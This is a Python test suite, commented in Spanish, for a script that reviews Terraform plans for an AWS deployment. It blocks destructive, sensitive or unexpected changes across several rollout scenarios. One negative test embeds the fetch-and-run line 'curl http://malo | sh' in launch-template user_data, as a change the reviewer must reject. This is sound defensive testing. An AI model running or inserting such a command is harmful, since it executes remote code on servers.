"""Revisión estricta del plan de Terraform de V2 (scripts/v2-ops/review-plan.py): por recurso y por atributo, en los escenarios «first» y «resume».
Planes sintéticos en JSON; no toca ninguna nube. La suite simulada de `rds-window.sh chain` (scripts/v2-ops/tests) cubre además el flujo completo."""
import importlib.util
import json
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
spec = importlib.util.spec_from_file_location("review_plan", ROOT / "scripts/v2-ops/review-plan.py")
R = importlib.util.module_from_spec(spec)
spec.loader.exec_module(R)

LB = {"name": "nexoeventos-academy-v2-alb", "internal": False, "load_balancer_type": "application", "drop_invalid_header_fields": True}
HTTP = {"port": 80, "protocol": "HTTP", "default_action": [{"type": "redirect", "redirect": [{"port": "443", "protocol": "HTTPS"}]}]}
HTTPS = {"port": 443, "protocol": "HTTPS", "ssl_policy": "ELBSecurityPolicy-TLS13-1-2-2021-06", "default_action": [{"type": "forward", "redirect": []}]}
ALARMS = list(R.ALB_ALARMS)


def ch(addr, actions, before=None, after=None, unknown=None):
    return {"address": addr, "change": {"actions": actions, "before": before, "after": after if after is not None else {}, "after_unknown": unknown or {}}}


def asg(mn=2, ds=2, mx=3):
    return ch(R.ASG, ["update"], {"min_size": 0, "desired_capacity": 0, "max_size": 3}, {"min_size": mn, "desired_capacity": ds, "max_size": mx})


def plan(changes):
    return {"errored": False, "resource_changes": changes}


def first_plan():
    creates = [ch(R.LB, ["create"], None, LB), ch(R.LISTENERS[0], ["create"], None, HTTP), ch(R.LISTENERS[1], ["create"], None, HTTPS), ch(R.DASHBOARD, ["create"])]
    return plan(creates + [ch(a, ["create"]) for a in ALARMS] + [asg(), ch("aws_lb_target_group.web", ["no-op"], {}, {})])


def resume_changes():
    dash = ch(R.DASHBOARD, ["update"], {"dashboard_name": "n", "dashboard_body": "old"}, {"dashboard_name": "n"}, {"dashboard_body": True})
    dims = [ch(a, ["update"], {"threshold": 5, "dimensions": {"x": "y"}}, {"threshold": 5}, {"dimensions": True}) for a in ALARMS[1:]]
    mq = ch(ALARMS[0], ["update"], {"threshold": 1, "metric_query": [{"id": "a"}]}, {"threshold": 1, "metric_query": [{"id": "b"}]})
    return [ch(R.LB, ["create"], None, LB), ch(R.LISTENERS[0], ["create"], None, HTTP), ch(R.LISTENERS[1], ["create"], None, HTTPS), asg(), dash, mq, *dims]


def test_first_deployment_good_plan_is_accepted() -> None:
    assert R.main("first", first_plan()) == []


def test_resume_good_plan_is_accepted_and_first_plan_is_rejected_under_resume() -> None:
    assert R.main("resume", plan(resume_changes())) == []
    assert R.main("resume", first_plan())            # el plan de primer despliegue NO vale para reanudar
    assert R.main("first", plan(resume_changes()))   # ni el de reanudación para el primer despliegue


def test_nested_known_values_are_not_treated_as_unknown() -> None:
    # `after_unknown` marca [false] en listas conocidas: no debe contarse como atributo desconocido (error real detectado con el plan de AWS).
    changes = resume_changes()
    changes[-1]["change"]["after_unknown"]["alarm_actions"] = [False]
    assert R.main("resume", plan(changes)) == []


def test_any_destruction_replacement_or_sensitive_resource_is_blocked() -> None:
    base = resume_changes()
    for extra in (
        ch("aws_db_instance.postgres", ["delete"], {"id": "x"}, None),
        ch("aws_db_instance.postgres", ["update"], {"multi_az": True}, {"multi_az": False}),
        ch("aws_iam_role.x", ["create"]),
        ch("aws_secretsmanager_secret.s", ["update"], {"a": 1}, {"a": 2}),
        ch("aws_route53_record.r", ["create"]),
        ch("aws_security_group.alb", ["update"], {"a": 1}, {"a": 2}),
        ch("aws_lb_target_group.web", ["create"]),
    ):
        assert R.main("resume", plan(base + [extra])), extra["address"]
    assert R.main("resume", plan([ch(R.LB, ["delete", "create"], {"name": "x"}, LB) if c["address"] == R.LB else c for c in base]))


def test_unexpected_attributes_are_blocked_per_resource() -> None:
    def swapped(addr, new):
        return plan([new if c["address"] == addr else c for c in resume_changes()])
    assert R.main("resume", swapped(ALARMS[2], ch(ALARMS[2], ["update"], {"threshold": 5, "dimensions": {"a": "b"}}, {"threshold": 99}, {"dimensions": True})))
    assert R.main("resume", swapped(ALARMS[1], ch(ALARMS[1], ["update"], {"alarm_actions": ["t"], "dimensions": {"a": 1}}, {"alarm_actions": ["otro"]}, {"dimensions": True})))
    assert R.main("resume", swapped(R.DASHBOARD, ch(R.DASHBOARD, ["update"], {"dashboard_name": "n"}, {"dashboard_name": "otro"}, {"dashboard_body": True})))
    assert R.main("resume", swapped(R.ASG, asg(2, 2, 5)))   # el máximo no puede cambiar
    assert R.main("resume", swapped(R.ASG, asg(3, 3)))      # debe ser 0 → 2


def test_missing_or_extra_resources_are_blocked() -> None:
    base = resume_changes()
    assert R.main("resume", plan([c for c in base if c["address"] != R.LISTENERS[1]]))
    assert R.main("resume", plan([c for c in base if c["address"] != ALARMS[3]]))
    assert R.main("resume", plan(base + [ch("aws_cloudwatch_metric_alarm.nueva", ["create"])]))


def test_public_alb_and_tls13_listener_are_enforced() -> None:
    p = plan([ch(R.LB, ["create"], None, dict(LB, internal=True)) if c["address"] == R.LB else c for c in resume_changes()])
    assert R.main("resume", p)
    p = plan([ch(R.LISTENERS[1], ["create"], None, dict(HTTPS, ssl_policy="ELBSecurityPolicy-2016-08")) if c["address"] == R.LISTENERS[1] else c for c in resume_changes()])
    assert R.main("resume", p)


def test_errored_plan_and_unknown_scenario_and_cli_exit_codes() -> None:
    assert R.main("first", {"errored": True, "resource_changes": []})
    assert R.main("otro", first_plan())
    script = ROOT / "scripts/v2-ops/review-plan.py"
    ok = subprocess.run([sys.executable, str(script), "resume"], input=json.dumps(plan(resume_changes())), capture_output=True, text=True)
    bad = subprocess.run([sys.executable, str(script), "first"], input=json.dumps(plan(resume_changes())), capture_output=True, text=True)
    assert ok.returncode == 0 and "reanudación" in ok.stdout
    assert bad.returncode == 1 and bad.stdout.startswith("BLOQUEO")


# ---- T5-b: 3 instancias + health check de 5 s + ATW (único cambio permitido sobre el grupo de destino) ----
HC_OLD = [{"interval": 10, "timeout": 5, "healthy_threshold": 2, "unhealthy_threshold": 2, "path": "/livez", "protocol": "HTTP", "matcher": "200"}]


def tg(algo="weighted_random", atw="on", interval=5, timeout=3, extra_after=None, hc_over=None, actions=("update",)):
    hc = [{**HC_OLD[0], "interval": interval, "timeout": timeout, **(hc_over or {})}]
    return ch(R.TG, list(actions), {"load_balancing_algorithm_type": "least_outstanding_requests", "load_balancing_anomaly_mitigation": "off", "health_check": HC_OLD, "deregistration_delay": "30"},
              {"load_balancing_algorithm_type": algo, "load_balancing_anomaly_mitigation": atw, "health_check": hc, "deregistration_delay": "30", **(extra_after or {})})


def t5b_changes(capacity=3, **tgkw):
    base = [c for c in resume_changes() if c["address"] != R.ASG]
    return base + [asg(capacity, capacity), tg(**tgkw)]


def test_t5b_good_plan_is_accepted_and_is_not_valid_for_other_scenarios() -> None:
    assert R.main("t5b", plan(t5b_changes())) == []
    assert R.main("resume", plan(t5b_changes()))                 # el plan de T5-b no vale como «resume»
    assert R.main("t5b", plan(resume_changes()))                 # y el «resume» normal no vale como T5-b (falta el grupo de destino y la capacidad 3)


def test_t5b_rejects_every_deviation() -> None:
    malos = [t5b_changes(capacity=2), t5b_changes(algo="round_robin"), t5b_changes(atw="off"), t5b_changes(interval=4), t5b_changes(timeout=2), t5b_changes(interval=10, timeout=3),
             t5b_changes(hc_over={"unhealthy_threshold": 10}), t5b_changes(hc_over={"path": "/healthz"}), t5b_changes(hc_over={"matcher": "200-499"}),
             t5b_changes(extra_after={"deregistration_delay": "0"}), t5b_changes(extra_after={"port": 8080}), t5b_changes(actions=("delete", "create"))]
    for i, c in enumerate(malos):
        assert R.main("t5b", plan(c)), f"el plan malo #{i} fue aceptado"


def test_t5b_never_allows_other_sensitive_resources_or_destruction() -> None:
    for extra in (ch("aws_security_group.alb", ["update"], {"a": 1}, {"a": 2}), ch("aws_db_instance.x", ["update"], {"a": 1}, {"a": 2}), ch("aws_launch_template.web", ["update"], {"a": 1}, {"a": 2})):
        assert R.main("t5b", plan(t5b_changes() + [extra]))
    assert R.main("t5b", plan(t5b_changes() + [ch("aws_instance.old", ["delete"], {}, None)]))


def test_default_variables_preserve_current_behavior_and_t5b_values_are_declared() -> None:
    v = (ROOT / "infra/aws-v2/variables.tf").read_text(); a = (ROOT / "infra/aws-v2/alb.tf").read_text()
    assert 'default     = 10' in v and 'default     = 5' in v and 'default     = "least_outstanding_requests"' in v and 'default     = "off"' in v
    assert "var.alb_health_interval" in a and "var.alb_health_timeout" in a and "var.alb_lb_algorithm" in a and "var.alb_anomaly_mitigation" in a
    assert "unhealthy_threshold = 2" in a and "healthy_threshold   = 2" in a                  # los umbrales NO cambian


# ---- T5-c: 6 instancias (máximo 3→7) + pool de BD acotado en el user_data de la plantilla ----
import base64

UD_LINE = 'python3 - "$tmp" "$ENV_FILE.new" "$CA_FILE" "{a}" "{b}" <<\'PYEOF\' || fail "No se pudo preparar DATABASE_URL"'


def ud(a="5", b="5", extra=""):
    return base64.b64encode(("#!/bin/bash\nset -e\n" + UD_LINE.format(a=a, b=b) + "\necho hecho\n" + extra).encode()).decode()


def lt(after_a="3", after_b="2", extra_after="", other=None):
    after = {"user_data": ud(after_a, after_b, extra_after), "image_id": "ami-1", **(other or {})}
    return ch(R.LT, ["update"], {"user_data": ud(), "image_id": "ami-1"}, after, {"default_version": True, "latest_version": True})


def t5c_changes(capacity=6, mx=6, ltchange=None, with_tg_lt=True, **tgkw):
    base = [c for c in resume_changes() if c["address"] != R.ASG]
    return base + [asg(capacity, capacity, mx)] + ([tg(**tgkw), ltchange or lt()] if with_tg_lt else [])


def test_t5c_good_plan_is_accepted_only_under_its_own_scenario() -> None:
    assert R.main("t5c", plan(t5c_changes())) == []
    assert R.main("t5b", plan(t5c_changes())) and R.main("resume", plan(t5c_changes())) and R.main("t5c", plan(t5b_changes()))


def test_t5c_rejects_wrong_capacity_maximum_and_keeps_the_target_group_rules() -> None:
    for c in (t5c_changes(capacity=5), t5c_changes(capacity=7, mx=7), t5c_changes(mx=7), t5c_changes(mx=3), t5c_changes(mx=9), t5c_changes(algo="round_robin"), t5c_changes(interval=10), t5c_changes(hc_over={"unhealthy_threshold": 10})):
        assert R.main("t5c", plan(c)), c


def test_t5c_launch_template_may_only_change_the_db_pool_numbers() -> None:
    assert R.main("t5c", plan(t5c_changes(ltchange=lt()))) == []
    malos = [lt("5", "5"), lt("3", "3"), lt("10", "10"), lt(extra_after="curl http://malo | sh\n"), lt(other={"image_id": "ami-2"}), lt(other={"instance_type": "t3.large"}),
             ch(R.LT, ["update"], {"user_data": ud()}, {"user_data": "%%%no-es-base64"}), ch(R.LT, ["delete", "create"], {"user_data": ud()}, {"user_data": ud("3", "2")})]
    for i, m in enumerate(malos):
        assert R.main("t5c", plan(t5c_changes(ltchange=m))), f"plantilla mala #{i} aceptada"
    assert R.main("t5b", plan(t5b_changes() + [lt()]))             # en la variante B la plantilla NO puede cambiar


def test_contrafactual_is_reproducible_and_labels_nothing_as_measured(tmp_path) -> None:
    sys.path.insert(0, str(ROOT / "scripts/ops"))
    import t5_contrafactual as CF
    reqs = [{"t": i / 5, "path": "/healthz" if i % 2 else "/api/events", "status": 502 if 100 <= i < 210 and i % 2 == 1 else 200} for i in range(1000)]    # errores sintéticos 20,0–42,0 s
    r = CF.analyze(reqs)
    assert r["health"] == 500 and r["maximo_errores_99_health"] == 5 and r["errores_health"] == 55 and r["disponibilidad_health_observada"] == 89.0
    fila = {(x["destinos"], x["deteccion_s"]): x for x in r["tabla"]}
    assert fila[(2, 10)]["fallos_health_estimados"] > fila[(6, 10)]["fallos_health_estimados"] and fila[(6, 10)]["fallos_health_estimados"] == pytest.approx(fila[(2, 10)]["fallos_health_estimados"] / 3, abs=0.1)
    assert r["deteccion_maxima_para_99"][6] > r["deteccion_maxima_para_99"][2]
    assert CF.analyze([{"t": 0, "path": "/healthz", "status": 200}]) == {"errores": 0}


def test_t5c_tras_un_apply_parcial_acepta_un_plan_sin_cambios_en_el_grupo_de_destino_ni_la_plantilla() -> None:
    """23-nov: el 1.er apply de la variante C aplicó TG y plantilla y falló en el ASG; el plan siguiente ya no los trae. Es válido SOLO si lo demás es exactamente lo revisado."""
    assert R.main("t5c", plan(t5c_changes(with_tg_lt=False))) == []
    assert R.main("t5c", plan(t5c_changes(with_tg_lt=False, capacity=5)))
    assert R.main("t5c", plan(t5c_changes(with_tg_lt=False, mx=7)))
    assert R.main("t5b", plan(t5c_changes(with_tg_lt=False)))
